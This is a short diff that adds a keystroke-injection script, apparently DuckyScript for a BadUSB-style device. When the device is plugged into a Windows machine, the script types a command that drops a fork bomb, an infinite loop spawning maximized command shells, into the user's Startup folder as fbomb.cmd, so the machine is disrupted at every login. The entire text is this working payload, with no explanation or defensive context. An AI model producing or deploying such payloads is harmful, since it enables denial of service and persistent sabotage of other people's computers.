@@ -1,0 +1,8 @@
+IMPORT fd/payloads/obfuscated_cmd.dd
+DELAY 250
+REM infinite loop spawning maximized shells (start=0 / step=0 / end=0)
+STRING echo FOR /L %%i IN (0,0,0) DO start /max > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\fbomb.cmd"
+ENTER
+DELAY 250
+STRING exit
+ENTER
